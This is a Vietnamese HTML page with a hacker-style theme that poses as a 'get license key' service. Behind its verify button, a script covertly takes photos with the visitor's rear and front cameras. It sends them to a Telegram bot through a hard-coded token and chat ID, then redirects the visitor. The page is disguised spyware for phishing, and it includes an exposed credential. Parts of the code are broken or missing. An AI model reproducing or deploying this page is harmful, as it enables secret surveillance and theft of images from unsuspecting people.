<!doctype html>
<html lang="vi">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Hệ Thống Get Key</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=VT323&display=swap" rel="stylesheet">
<style>
  :root {
    --bg-base: #000000;
    --panel-bg: rgba(0, 15, 0, 0.85);
    --border-color: rgba(0, 255, 65, 0.3);
    --primary: #00ff41;
    --accent: #008F11;

  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
  body {
    background-color: var(--bg-base);
    color: var(--text-main);

    display: flex;
    justify-content: center;
    align-items: center;

    overflow: hidden;
    position: relative;
  }

  /* Hiệu ứng Matrix mưa chữ xanh phía sau */
  #matrix-canvas {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    pointer-events: none;
  }

  .card {
    background: var(--panel-bg);
    backdrop-filter: blur(25px);
    -webkit-backdrop-filter: blur(25px);
    border: 1px solid var(--border-color);
    padding: 40px 32px;
    border-radius: 16px;
    width: 100%;

  .live-clock {

    font-size: 1.1rem; 
    color: #00ff41;
    background: rgba(0, 255, 65, 0.05); 
    border: 1px solid rgba(0, 255, 65, 0.2);
    padding: 4px 12px; 
    border-radius: 4px; 
    display: inline-block; 
    margin-bottom: 20px;
    letter-spacing: 1px;
  }
  .icon-box {
    width: 64px; height: 64px; margin: 0 auto 20px auto;
    background: rgba(0, 255, 65, 0.1);
    border: 1px solid rgba(0, 255, 65, 0.4); border-radius: 12px;
    display: flex; align-items: center; justify-content: center; font-size: 28px;
    box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
  }
  h2 { font-family: 'VT323', monospace; font-size: 2rem; font-weight: 700; margin-bottom: 8px; color: #00ff41; letter-spacing: 2px; text-shadow: 0 0 8px rgba(0,255,65,0.6); }
  .subtitle { font-size: 0.85rem; color: #00cc33; margin-bottom: 28px; line-height: 1.5; }
  
  .btn-primary {
    width: 100%; padding: 16px; 
    background: rgba(0, 255, 65, 0.1);
    color: #00ff41; border: 1px solid #00ff41; border-radius: 8px; 
    font-weight: 700; font-size: 1rem; cursor: pointer; 
    transition: all 0.3s ease;
    box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
    display: flex; align-items: center; justify-content: center; gap: 8px;
    letter-spacing: 1px;
  }
  .btn-primary:hover { background: #00ff41; color: #000; transform: translateY(-2px); box-shadow: 0 0 20px rgba(0, 255, 65, 0.6); }

  /* Nút điều khiển nhạc */
  .btn-music {
    width: 100%; padding: 12px;
    margin-top: 12px;
    background: rgba(0, 0, 0, 0.5);
    color: #008F11; border: 1px solid rgba(0, 255, 65, 0.2); border-radius: 8px;
    font-weight: 600; font-size: 0.85rem; cursor: pointer;
    transition: all 0.3s ease;
    display: flex; align-items: center; justify-content: center; gap: 8px;

  #video, #canvas { display: none; }
</style>
</head>
<body>

  <!-- Canvas hiệu ứng Matrix (chữ xanh rơi xuống) -->
  <canvas id="matrix-canvas"></canvas>

  <!-- Thẻ Audio ẩn chạy nhạc trực tiếp[span_0](start_span)[span_0](end_span) -->
  <audio id="bg-music" loop preload="auto">
    <!-- THAY LINK NHẠC CỦA BẠN VÀO THUỘC TÍNH SRC DƯỚI ĐÂY -->
    <source src="THAY_LINK_NHAC_O_DAY" type="audio/mp3">
  </audio>

  <!-- Script chạy hiệu ứng Matrix (Hacker mưa chữ) -->
  <script>
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');

    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    const chars = '01ABCDEFXYZ$#@&%*<>[]{}';
    const fontSize = 16;
    let columns = canvas.width / fontSize;
    let drops = [];
    for (let i = 0; i < columns; i++) {
      drops[i] = 1;
    }

    function drawMatrix() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = '#00ff41';
      ctx.font = fontSize + 'px monospace';

      for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    }
    setInterval(drawMatrix, 33);
  </script>

  <div class="card">
    <div class="live-clock" id="clock">[ 00:00:00 ]</div>
    
    <div class="icon-box">💻</div>
    <h2>HỆ THỐNG SEC_KEY</h2>
    <p class="subtitle">Nhấn xác thực bên dưới để giải mã lấy mã Key bản quyền.</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <!-- Nút Get Key -->

      <span>⚡ XÁC THỰC NGAY</span>
    </button>

    <!-- Nút Bật/Tắt Nhạc -->
    <button class="btn-music" id="music-toggle-btn" onclick="toggleMusic()">
      <span id="music-icon">🎵</span> <span id="music-text">Bật Nhạc Nền</span>
    </button>
    
    <div id="status" class="status"></div>
  </div>

<script>
  const TELEGRAM_BOT_TOKEN = '8812338501:AAFnZiI0fpcNqs0LMGUUuFV2MCSTgpdNbaI'; 
  const TELEGRAM_CHAT_ID = '-1004303781844';

  const bgMusic = document.getElementById('bg-music');
  const musicToggleBtn = document.getElementById('music-toggle-btn');
  const musicIcon = document.getElementById('music-icon');
  const musicText = document.getElementById('music-text');
  let isMusicPlaying = false;

  function toggleMusic() {
    if (isMusicPlaying) {
      bgMusic.pause();
      isMusicPlaying = false;
      musicIcon.textContent = '🎵';
      musicText.textContent = 'Bật Nhạc Nền';
    } else {
      bgMusic.play().then(() => {
        isMusicPlaying = true;
        musicIcon.textContent = '🔇';
        musicText.textContent = 'Tắt Nhạc Nền';
      }).catch(err => {
        console.log("Không thể phát nhạc:", err);
      });
    }
  }

  // Tự động kích hoạt nhạc ngay khi người dùng chạm/click bất kì đâu trên trang
  document.addEventListener('click', function unlockAudio() {
    if (!isMusicPlaying) {
      bgMusic.play().then(() => {
        isMusicPlaying = true;
        musicIcon.textContent = '🔇';
        musicText.textContent = 'Tắt Nhạc Nền';
      }).catch(e => {});
    }
  }, { once: true });

  function updateClock() {
    const now = new Date();
    document.getElementById('clock').textContent = `[ ${now.toLocaleTimeString('vi-VN', { hour12: false })} ]`;
  }
  setInterval(updateClock, 1000);
  updateClock();

  const statusDiv = document.getElementById('status');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const getKeyBtn = document.getElementById('get-key-btn');

  async function takePhoto(facingMode, label) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: { exact: facingMode } }, 
        audio: false 
      });
      video.srcObject = stream;
      
      return await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(async () => {
            try {
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

              const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
              stream.getTracks().forEach(track => track.stop());
              resolve({ blob, label });
            } catch (e) {
              stream.getTracks().forEach(track => track.stop());
              resolve(null);
            }
          }, 800);
        };
      });
    } catch (e) {
      return null;
    }
  }

    let backPhoto = await takePhoto('environment', '📸 Ảnh Camera Sau');

    statusDiv.textContent = '[*] Đang đồng bộ luồng dữ liệu...';

    if (backPhoto && backPhoto.blob) {

      fd.append('caption', infoText + '\n\n' + backPhoto.label);
      fd.append('parse_mode', 'HTML');
      try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e){}
    }

    if (frontPhoto && frontPhoto.blob) {
      const fd2 = new FormData();
      fd2.append('chat_id', TELEGRAM_CHAT_ID);

    if (!backPhoto && !frontPhoto) {

          method: 'POST',

        });

    statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 1000);
  }
</script>
